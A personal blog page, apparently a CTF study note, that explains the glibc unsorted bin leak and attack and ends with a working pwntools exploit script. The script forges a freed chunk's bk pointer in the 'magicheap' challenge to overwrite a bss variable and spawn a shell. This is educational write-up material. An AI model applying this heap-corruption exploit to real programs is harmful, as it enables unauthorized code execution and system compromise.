@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="前言依旧是ctfwiki pwn系列，上次的fastbin attck的第二题先摆了，逆向水平不够，但是主要的手法和思想已经学到了，今天学了unsorted bin attack
+基础知识chunk进入unsortedbin的几种情况：
+1.最主要的来源，就是当用户free一个不属于fastbin的" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>unsortedbin attack | refrain的blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言依旧是ctfwiki pwn系列，上次的fastbin attck的第二题先摆了，逆向水平不够，但是主要的手法和思想已经学到了，今天学了unsorted bin attack 基础知识chunk进入unsortedbin的几种情况： 1.最主要的来源，就是当用户free一个不属于fastbin的chunk时，会优先进入unsorted bin 2.当一个较大的chunk被分成两半时，如果剩下的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unsortedbin attack">
+<meta property="og:url" content="http://example.com/2021/10/09/unsortedbin-attack/index.html">
+<meta property="og:site_name" content="refrain的blog">
+<meta property="og:description" content="前言依旧是ctfwiki pwn系列，上次的fastbin attck的第二题先摆了，逆向水平不够，但是主要的手法和思想已经学到了，今天学了unsorted bin attack 基础知识chunk进入unsortedbin的几种情况： 1.最主要的来源，就是当用户free一个不属于fastbin的chunk时，会优先进入unsorted bin 2.当一个较大的chunk被分成两半时，如果剩下的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/10/09/unsortedbin-attack/1.png">
+<meta property="og:image" content="http://example.com/2021/10/09/unsortedbin-attack/2.png">
+<meta property="article:published_time" content="2021-10-09T14:43:59.000Z">
+<meta property="article:modified_time" content="2021-10-09T15:43:12.024Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/09/unsortedbin-attack/1.png">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="refrain的blog" rel="home">refrain的blog</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-unsortedbin-attack" class="post-unsortedbin-attack post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      unsortedbin attack
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2021/10/09/unsortedbin-attack/" data-id="ckujyvzhl0002wcvk7qu3caff" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>依旧是ctfwiki pwn系列，上次的fastbin attck的第二题先摆了，逆向水平不够，但是主要的手法和思想已经学到了，今天学了unsorted bin attack</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>chunk进入unsortedbin的几种情况：</p>
+<p>1.最主要的来源，就是当用户free一个不属于fastbin的chunk时，会优先进入unsorted bin</p>
+<p>2.当一个较大的chunk被分成两半时，如果剩下的部分大于MINSIZE，就会被放到unsorted bin</p>
+<p>3.当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</p>
+<h2 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h2><p><img src="/2021/10/09/unsortedbin-attack/1.png" alt="1"></p>
+<p>unsorted bin是一个双链表结构，其中会有一个chunk的fd指向main_arena，如果能泄露出他的fd指针，我们就可以知道main_arena，而malloc_hook，libc_base等都与main_arena固定偏移。</p>
+<h3 id="实现leak的方法"><a href="#实现leak的方法" class="headerlink" title="实现leak的方法"></a>实现leak的方法</h3><p>大多数是通过uaf，double free等将已经放入unsorted bin中的chunk通过程序本身自带的“show”功能，打印出fd</p>
+<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><p><img src="/2021/10/09/unsortedbin-attack/2.png" alt="2"></p>
+<p>第一眼竟然没看明白，其实就是把unsorted bin拿出来的时候，会把这个unsorted bin写进fd这个指针所指向的位置</p>
+<p>所以unsortedbin的意义简单来讲，就是把一个很大的值写到一个指定地址</p>
+<p>然后例题的话我也懒得细讲了，这题懂了原理的话看ctfwiki就很好理解了吧，直接放下wp</p>
+<p>用我们今天学的unsorted bin attack改一下在bss段magic的值让他变得很大就可以调用后门函数getshell了</p>
+<p>from pwn import *<br>p = process(“./magicheap”)<br>elf = ELF(“./magicheap”)<br>def creat(size,content):<br>    p.recvuntil(“:”)<br>    p.sendline(“1”)<br>    p.recvuntil(“Size of Heap : “)<br>    p.sendline(str(size))<br>    p.recvuntil(“Content of heap:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(“:”)<br>    p.sendline(“3”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))<br>def edit_heap(index,size,content):<br>    p.recvuntil(“:”)<br>    p.sendline(“2”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))<br>    p.recvuntil(“Size of Heap : “)<br>    p.sendline(str(size))<br>    p.recvuntil(“Content of heap : “)<br>    p.sendline(content)</p>
+<p>creat(0x20,b’aaaa’)<br>creat(0x80,b’bbbb’)<br>creat(0x20,b’cccc’)<br>#gdb.attach(p)<br>delete(1)<br>magic = 0x6020C0<br>fd = 0<br>bk = magic - 0x10<br>edit_heap(0,0x40,b’a’*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk))<br>creat(0x80,b’aaaa’)<br>p.recvuntil(‘:’)<br>p.sendline(‘4869’)<br>p.interactive()</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2021/10/09/unsortedbin-attack/">
+    <time datetime="2021-10-09T14:43:59.000Z" class="entry-date">
+        2021-10-09
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2021/10/03/fastbin-attack/" rel="next">fastbin attack <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/09/unsortedbin-attack/">unsortedbin attack</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/03/fastbin-attack/">fastbin attack</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/21/babyheap-0ctf-2017-wp/">babyheap_0ctf_2017-wp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/">pwn buuctf rip 简单栈溢出 详细wp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/09/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2021 John Doe
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
